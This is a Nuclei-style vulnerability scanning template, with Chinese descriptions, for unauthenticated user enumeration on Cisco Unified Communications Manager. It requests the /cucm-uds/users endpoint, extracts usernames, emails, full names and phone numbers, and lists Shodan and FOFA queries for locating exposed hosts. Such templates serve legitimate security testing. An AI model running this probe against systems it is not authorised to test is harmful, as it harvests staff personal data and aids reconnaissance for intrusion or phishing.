id: cucm-username-enumeration

info:
  name: Cisco Unified Communications Manager - 用户名枚举漏洞
  author: manasmbellani,Morgan Robertson
  severity: medium
  description: Cisco Unified Communications Manager - User Enumeration 存在用户名枚举漏洞。该模板依据实际请求路径、返回特征与命中证据验证目标是否暴露相应漏洞。
  remediation: |
    - 为敏感接口补充鉴权与最小化返回策略，避免未授权用户获取配置、账户或节点信息。
    - 审核日志、错误页和调试接口的输出内容，关闭不必要的调试或管理入口。
  reference:
    - https://developer.cisco.com/site/user-data-services/develop-and-test/api-reference/#users
    - https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/
  metadata:
    verified: true
    product: unified_communications_manager
    vendor: cisco
    shodan-query: html:"/ucmuser/"
    fofa-query: title="Unified Communications Self Care Portal"
  tags: cisco,ucm,enum,users,xml,cucm,unauth,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/cucm-uds/users"

    headers:
      Accept: application/xml

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '<users'
          - '<userName>'
          - '<lastName>'
          - '<phoneNumber>'
        condition: and

      - type: dsl
        dsl:
          - contains(tolower(content_type), 'application/xml')
          - contains(tolower(content_type), 'text/xml')
        condition: or

    extractors:
      - type: xpath
        name: usernames
        xpath:
          - "/users/user/userName"

      - type: xpath
        name: emails
        xpath:
          - "/users/user/email"

      - type: xpath
        name: full_names
        xpath:
          - "concat(/users/user/firstName, ' ', /users/user/lastName)"

      - type: xpath
        name: phone_numbers
        xpath:
          - "/users/user/phoneNumber"

      - type: xpath
        name: mobile_numbers
        xpath:
          - "/users/user/mobileNumber"
